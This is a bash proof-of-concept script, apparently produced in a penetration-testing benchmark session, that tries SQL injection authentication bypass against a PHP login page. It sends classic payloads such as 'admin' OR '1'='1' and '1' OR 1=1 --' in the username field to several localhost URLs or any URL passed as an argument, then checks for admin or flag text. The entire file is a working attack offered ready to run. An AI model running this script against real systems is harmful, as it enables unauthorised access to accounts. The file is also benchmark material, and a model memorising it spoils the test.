#!/bin/bash
# POC: SQL injection authentication bypass POC for /index.php POST username parameter with adaptive targeting
# Target: ./repo
# Created: 2025-11-07T21:36:05.682Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# SQL Injection Authentication Bypass POC - Version 2
# Target: /index.php - POST username parameter
# Vulnerability: SQL injection in authentication logic

# Try multiple possible target URLs
TARGETS=(
    "http://127.0.0.1/index.php"
    "http://localhost/index.php"
    "http://localhost:80/index.php"
    "http://localhost:8080/index.php"
    "http://target/index.php"
)

# If URL provided as argument, use it
if [ ! -z "$1" ]; then
    TARGETS=("$1")
fi

OUTPUT_FILE="/tmp/sqli_poc_results.txt"
VULNERABLE=0

echo "================================================"
echo "SQL Injection Authentication Bypass POC"
echo "================================================"
echo ""

for TARGET_URL in "${TARGETS[@]}"; do
    echo "[*] Attempting target: $TARGET_URL"
    
    # Test connectivity first
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
      -d "username=test&password=test&login=Login" \
      -H "Content-Type: application/x-www-form-urlencoded" -m 5)
    
    if [ "$HTTP_CODE" = "000" ]; then
        echo "    ✗ Cannot reach target (Connection failed)"
        continue
    else
        echo "    ✓ Target reachable (HTTP $HTTP_CODE)"
    fi
    
    # Test 1: Classic OR injection
    echo "    [T1] Testing: admin' OR '1'='1"
    RESPONSE=$(curl -s -X POST "$TARGET_URL" \
      -d "username=admin' OR '1'='1&password=test&login=Login" \
      -H "Content-Type: application/x-www-form-urlencoded" -m 5)
    
    if echo "$RESPONSE" | grep -qi "Welcome Admin\|Congratulations\|flag\|success"; then
        echo "    ✓ VULNERABLE: Injection successful"
        echo "$RESPONSE" > "$OUTPUT_FILE"
        VULNERABLE=1
        break
    fi
    
    # Test 2: Comment-based injection
    echo "    [T2] Testing: 1' OR 1=1 --"
    RESPONSE=$(curl -s -X POST "$TARGET_URL" \
      -d "username=1' OR 1=1 --&password=test&login=Login" \
      -H "Content-Type: application/x-www-form-urlencoded" -m 5)
    
    if echo "$RESPONSE" | grep -qi "Welcome Admin\|Congratulations\|flag\|success"; then
        echo "    ✓ VULNERABLE: Injection successful"
        echo "$RESPONSE" > "$OUTPUT_FILE"
        VULNERABLE=1
        break
    fi
    
    # Test 3: Alternative syntax
    echo "    [T3] Testing: admin' OR 1=1 --"
    RESPONSE=$(curl -s -X POST "$TARGET_URL" \
      -d "username=admin' OR 1=1 --&password=test&login=Login" \
      -H "Content-Type: application/x-www-form-urlencoded" -m 5)
    
    if echo "$RESPONSE" | grep -qi "Welcome Admin\|Congratulations\|flag\|success"; then
        echo "    ✓ VULNERABLE: Injection successful"
        echo "$RESPONSE" > "$OUTPUT_FILE"
        VULNERABLE=1
        break
    fi
done

echo ""
echo "================================================"
echo "Results"
echo "================================================"

if [ $VULNERABLE -eq 1 ]; then
    echo "✓ SQL Injection Vulnerability CONFIRMED"
    echo "✓ Authentication bypass successful"
    exit 0
else
    echo "✗ Vulnerability not confirmed"
    echo "  - No target endpoint was reachable"
    echo "  - Run with target URL as argument: ./poc.sh http://target/index.php"
    exit 1
fi